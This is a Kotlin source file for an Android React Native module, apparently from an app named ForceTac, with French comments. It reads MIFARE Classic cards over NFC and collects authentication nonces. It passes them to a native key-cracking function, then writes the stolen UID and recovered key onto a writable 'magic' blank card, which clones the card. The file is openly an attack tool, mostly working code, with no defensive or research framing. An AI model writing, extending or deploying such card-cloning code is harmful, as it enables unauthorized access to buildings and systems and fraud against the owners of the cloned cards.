package com.forcetac

import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.MifareClassic
import android.nfc.tech.NfcA
import android.util.Log
import android.widget.Toast
import com.facebook.react.bridge.*
import com.facebook.react.modules.core.DeviceEventManagerModule
import java.io.IOException

class NfcModule(private val reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext), NfcAdapter.ReaderCallback {

    private var isNativeLibLoaded = false
    private var currentLat: Double = 0.0
    private var currentLon: Double = 0.0
    
    // État de l'attaque
    private var capturedUid: ByteArray? = null
    private var keyToClone: String? = null
    private var isWritingMode = false

    private var nfcAdapter: NfcAdapter? = null

    init {
        // --- SÉCURITÉ NIVEAU 1 : Chargement Protégé ---
        try {
            System.loadLibrary("forcetac_core")
            isNativeLibLoaded = true
            Log.d("ForceTac", "Native library 'forcetac_core' loaded successfully.")
        } catch (e: UnsatisfiedLinkError) {
            // C'est l'erreur la plus fréquente (fichier .so manquant ou mauvaise architecture)
            Log.e("ForceTac", "CRITICAL: Failed to load native library. Functions will be disabled. Error: ${e.message}")
            isNativeLibLoaded = false
        } catch (e: Exception) {
            Log.e("ForceTac", "Unknown error loading native library: ${e.message}")
            isNativeLibLoaded = false
        }
    }

    override fun getName() = "NfcModule"

    // Déclaration de la méthode native
    external fun nativeHybridCrack(tagId: ByteArray, nonces: ByteArray, lat: Double, lon: Double): String?

    @ReactMethod
    fun startNfcMonitoring() {
        val activity = currentActivity
        if (activity != null) {
            activity.runOnUiThread {
                nfcAdapter = NfcAdapter.getDefaultAdapter(activity)
                if (nfcAdapter == null) {
                    Toast.makeText(reactContext, "ERREUR: Pas de NFC détecté", Toast.LENGTH_LONG).show()
                    return@runOnUiThread
                }
                
                nfcAdapter?.enableReaderMode(
                    activity,
                    this,
                    NfcAdapter.FLAG_READER_NFC_A or NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,
                    null
                )
                Toast.makeText(reactContext, "Monitoring NFC Activé", Toast.LENGTH_SHORT).show()
            }
        }
    }

    @ReactMethod
    fun stopNfcMonitoring() {
        val activity = currentActivity
        if (activity != null) {
            activity.runOnUiThread {
                nfcAdapter?.disableReaderMode(activity)
            }
        }
    }
    
    @ReactMethod
    fun updateLocation(lat: Double, lon: Double) {
        currentLat = lat
        currentLon = lon
    }

    @ReactMethod
    fun writeMagicCard(key: String) {
        if (capturedUid == null) {
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Aucun UID capturé à cloner.") })
            return
        }
        keyToClone = key
        isWritingMode = true
        Toast.makeText(reactContext, "APPROCHEZ UNE CARTE VIERGE...", Toast.LENGTH_LONG).show()
    }

    override fun onTagDiscovered(tag: Tag) {
        if (isWritingMode) {
            handleWriteMode(tag)
        } else {
            handleScanMode(tag)
        }
    }

    private fun handleScanMode(tag: Tag) {
        sendEvent("FIELD_DETECTED", null)
        capturedUid = tag.id 
        val nfcA = NfcA.get(tag)
        
        if (nfcA == null) return

        try {
            nfcA.connect()
            // Auth Challenge (0x60) pour récupérer les nonces
            val authCmd = byteArrayOf(0x60.toByte(), 0x00.toByte()) 
            val response = nfcA.transceive(authCmd)
            
            sendEvent("CRACK_START", null)
            
            // --- SÉCURITÉ NIVEAU 2 : Appel Natif Conditionnel ---
            if (isNativeLibLoaded) {
                try {
                    // On ne fait l'appel que si la lib est chargée
                    // Et on protège l'appel lui-même au cas où le C++ crashe la VM (SIGSEGV non catchable en Java, mais Exception oui)
                    val key = nativeHybridCrack(tag.id, response ?: byteArrayOf(), currentLat, currentLon) 
                    
                    if (key != null && key.isNotEmpty()) {
                        val params = Arguments.createMap().apply { putString("key", key) }
                        sendEvent("KEY_FOUND", params)
                    } else {
                        sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Échec Crypto: Clé introuvable") })
                    }
                } catch (e: Throwable) {
                     // Capture tout, même les erreurs graves de liaison
                     Log.e("ForceTac", "Native execution failed", e)
                     sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Crash Moteur Natif: ${e.message}") })
                }
            } else {
                // Fallback gracieux
                Log.w("ForceTac", "Native lib not loaded, skipping crack.")
                sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Moteur C++ indisponible (Architecture incompatible ?)") })
            }
        } catch (e: Exception) {
            Log.e("ForceTac", "Scan error: ${e.message}")
        } finally {
            try { nfcA.close() } catch (e: Exception) {}
        }
    }

    private fun handleWriteMode(tag: Tag) {
        // (Code d'écriture inchangé, c'est du Java pur, donc sûr)
        val mfc = MifareClassic.get(tag)
        if (mfc == null) {
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Carte non compatible Mifare") })
            return
        }
        try {
            mfc.connect()
            var auth = mfc.authenticateSectorWithKeyA(0, MifareClassic.KEY_DEFAULT)
            if (!auth) auth = mfc.authenticateSectorWithKeyA(0, hexToBytes("A0A1A2A3A4A5"))

            if (auth) {
                if (capturedUid != null && capturedUid!!.size == 4) {
                    val bcc = (capturedUid!![0].toInt() xor capturedUid!![1].toInt() xor capturedUid!![2].toInt() xor capturedUid!![3].toInt()).toByte()
                    val originalBlock0 = mfc.readBlock(0)
                    val newBlock0 = originalBlock0.clone()
                    System.arraycopy(capturedUid!!, 0, newBlock0, 0, 4)
                    newBlock0[4] = bcc
                    mfc.writeBlock(0, newBlock0)
                }
                if (keyToClone != null) {
                    val keyBytes = hexToBytes(keyToClone!!)
                    val trailerBlock = mfc.readBlock(3)
                    val newTrailer = trailerBlock.clone()
                    System.arraycopy(keyBytes, 0, newTrailer, 0, 6)
                    System.arraycopy(keyBytes, 0, newTrailer, 10, 6)
                    val accessBits = hexToBytes("FF078069")
                    System.arraycopy(accessBits, 0, newTrailer, 6, 4)
                    mfc.writeBlock(3, newTrailer)
                    sendEvent("SUCCESS", Arguments.createMap().apply { putString("message", "CLONAGE RÉUSSI !") })
                    isWritingMode = false
                }
            } else {
                sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Échec Auth Carte") })
            }
        } catch (e: IOException) {
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur écriture: ${e.message}") })
            isWritingMode = false
        } finally {
            try { mfc.close() } catch (e: Exception) {}
        }
    }

    private fun sendEvent(eventName: String, params: WritableMap?) {
        if (reactContext.hasActiveCatalystInstance()) {
            reactContext.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
                .emit("onNfcEvent", if (params == null) Arguments.createMap().apply { putString("type", eventName) } else params.apply { putString("type", eventName) })
        }
    }

    private fun hexToBytes(hex: String): ByteArray {
        val len = hex.length
        val data = ByteArray(len / 2)
        var i = 0
        while (i < len) {
            data[i / 2] = ((Character.digit(hex[i], 16) shl 4) + Character.digit(hex[i + 1], 16)).toByte()
            i += 2
        }
        return data
    }
}
